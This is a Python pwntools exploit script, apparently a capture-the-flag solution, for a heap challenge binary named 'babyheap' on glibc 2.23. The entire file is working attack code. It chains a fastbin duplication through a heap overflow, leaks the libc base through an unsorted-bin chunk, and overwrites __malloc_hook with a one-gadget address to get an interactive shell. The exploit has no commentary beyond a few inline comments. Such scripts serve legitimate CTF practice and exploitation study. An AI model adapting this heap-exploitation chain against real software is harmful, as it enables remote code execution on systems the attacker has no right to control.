from pwn import *

io = remote('0.0.0.0', 10001)		# io = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def alloc(size):
	io.sendlineafter("Command: ", '1')
	io.sendlineafter("Size: ", str(size))

def fill(idx, cont):
	io.sendlineafter("Command: ", '2')
	io.sendlineafter("Index: ", str(idx))
	io.sendlineafter("Size: ", str(len(cont)))
	io.sendafter("Content: ", cont)

def free(idx):
	io.sendlineafter("Command: ", '3')
	io.sendlineafter("Index: ", str(idx))

def dump(idx):
	io.sendlineafter("Command: ", '4')
	io.sendlineafter("Index: ", str(idx))
	io.recvuntil("Content: \n")
	return io.recvline()

def fastbin_dup():
	alloc(0x10)						# chunk0
	alloc(0x10)						# chunk1
	alloc(0x10)						# chunk2
	alloc(0x10)						# chunk3
	alloc(0x80)						# chunk4
	free(1)
	free(2)

	payload  = "A" * 0x10
	payload += p64(0) + p64(0x21)
	payload += p64(0) + "A" * 8
	payload += p64(0) + p64(0x21)
	payload += p8(0x80)				# chunk2->fd => chunk4
	fill(0, payload)

	payload  = "A" * 0x10
	payload += p64(0) + p64(0x21)		# chunk4->size
	fill(3, payload)

	alloc(0x10)						# chunk1
	alloc(0x10)						# chunk2, overlap chunk4

def leak_libc():
	global libc_base
	global malloc_hook

	payload  = "A" * 0x10
	payload += p64(0) + p64(0x91)		# chunk4->size
	fill(3, payload)

	alloc(0x80)						# chunk5
	free(4)
	leak_addr = u64(dump(2)[:8])
	libc_base = leak_addr - 0x3c4b78
	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	log.info("leak address: 0x%x" % leak_addr)
	log.info("libc base: 0x%x" % libc_base)
	log.info("__malloc_hook address: 0x%x" % malloc_hook)

def pwn():
	alloc(0x60)						# chunk4
	free(4)
	fill(2, p64(malloc_hook - 0x20 + 0xd))

	alloc(0x60)						# chunk4
	alloc(0x60)						# chunk6 (fake chunk)
	one_gadget = libc_base + 0x4526a
	fill(6, p8(0)*3 + p64(one_gadget))	# __malloc_hook => one-gadget

	alloc(1)
	io.interactive()

if __name__=='__main__':
	fastbin_dup()
	leak_libc()
	pwn()
